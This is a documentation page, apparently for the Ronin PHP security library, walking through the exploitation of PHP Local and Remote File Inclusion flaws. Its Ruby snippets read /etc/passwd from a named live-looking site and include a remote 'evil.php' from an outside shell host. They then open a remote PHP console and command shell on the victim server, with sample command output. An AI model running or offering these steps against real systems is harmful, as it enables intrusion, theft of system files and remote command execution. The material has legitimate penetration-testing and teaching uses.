---
layout: default
title: Using Ronin PHP
---

# Using Ronin PHP

The [Ronin PHP](/docs/ronin-php/) library provides
support for PHP related security tasks, such as Local File Inclusion (LFI)
or Remote File Inclusion (RFI).

Before we can use this library in the Ronin Ruby Console, we must first
install the library. To install the Ronin Web library used in this guide,
simply run the following command:

    $ sudo gem install ronin-php

To start the Ronin Ruby Console, with ronin-php pre-loaded, simply run the
`ronin-php` command:

    $ ronin-php

## Local File Inclusion (LFI)

Test a URL for LFI:

{% highlight ruby %}
url = URI('http://www.e-builds.com/?page=Portfolio')
url.has_lfi?
# => true
{% endhighlight %}

Obtain a [Ronin::PHP::LFI](/docs/ronin-php/Ronin/PHP/LFI.html)
object which can be used to access files or finger-print the web server:

{% highlight ruby %}
lfi = url.first_lfi
{% endhighlight %}

Request a local file as a `String`:

{% highlight ruby %}
lfi.get('/etc/passwd')
{% endhighlight %}

Request a local file as a [Ronin::PHP::LFI::File](/docs/ronin-php/Ronin/PHP/LFI/File.html)
object:

{% highlight ruby %}
lfi.include('/etc/passwd')
# => #<Ronin::PHP::LFI::File:/etc/passwd>
{% endhighlight %}

## Remote File Inclusion (RFI)

Test a URL for RFI:

{% highlight ruby %}
url = URL('http://www.example.com/page.php?layout=default')
url.has_rfi?
# => true
{% endhighlight %}

Obtain a [Ronin::PHP::RFI](/docs/ronin-php/Ronin/PHP/RFI.html)
object which can be used to include other PHP files:

{% highlight ruby %}
rfi = url.first_rfi
{% endhighlight %}

Including a remote PHP file:

{% highlight ruby %}
rfi.include('http://www.shells4you.com/evil.php')
{% endhighlight %}

Using the Ronin PHP Remote Procedure Call (RPC) server:

{% highlight ruby %}
client = rfi.rpc
{% endhighlight %}

Using the PHP Console service to call PHP functions:

{% highlight ruby %}
php = client.console

php.phpversion
# => "4.3.10"

php.php_uname('-m')
# => "i686"
{% endhighlight %}

Using the PHP Shell service for quick command execution:

{% highlight ruby %}
shell = client.shell

shell.cwd
# => "/var/www/site/\n"

shell.cd '..'
# => ""

shell.exec('date -u')
# => "Thu Aug 21 10:29:38 UTC 2008\n"

shell.system('ps')
#    PID TTY          TIME CMD
#  27042 pts/8    00:00:00 bash
#  27841 pts/8    00:00:00 ps
# => nil
{% endhighlight %}

Using the Interactive Shell for the PHP-RPC Console service:

{% highlight ruby %}
php.interact
# >> phpversion();
# => "4.3.0"
# >> explode('|', 'one|two|three');
# => Array(
#   "one",
#   "two",
#   "three"
# )
# >> exit
# => nil
{% endhighlight %}

Using the Interactive Shell for the PHP-RPC Shell service:

{% highlight ruby %}
shell.interact
# $ pwd
# /var/www/site/
# $ cd ..
# $ ls -la
# ...
# $ exit
# => nil
{% endhighlight %}

